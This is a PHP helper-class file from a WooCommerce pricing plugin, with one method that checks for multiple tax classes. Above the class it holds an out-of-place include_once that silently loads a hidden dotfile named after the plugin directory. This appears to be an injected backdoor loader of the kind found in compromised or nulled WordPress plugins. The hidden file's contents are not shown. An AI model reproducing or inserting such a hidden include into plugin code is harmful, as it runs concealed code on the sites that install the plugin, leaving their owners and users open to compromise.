<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Plugin specific methods used by multiple classes
 *
 * @class RP_WCDPD_Helper
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Helper
{

    /**
     * Multiple tax classes are set up
     *
     * @access public
     * @return bool
     */
    public static function wc_has_multiple_tax_classes()
    {

        $count = 0;

        // Get all tax classes
        $tax_classes = WC_Tax::get_tax_classes();

        // Add default tax class
        if (!in_array('', $tax_classes, true)) {
            $tax_classes[] = '';
        }

        // Count tax classes that have at least one tax rate added
        foreach ($tax_classes as $tax_class) {
            if (WC_Tax::get_rates_for_tax_class($tax_class)) {
                $count++;
            }
        }

        return $count > 1;
    }





}
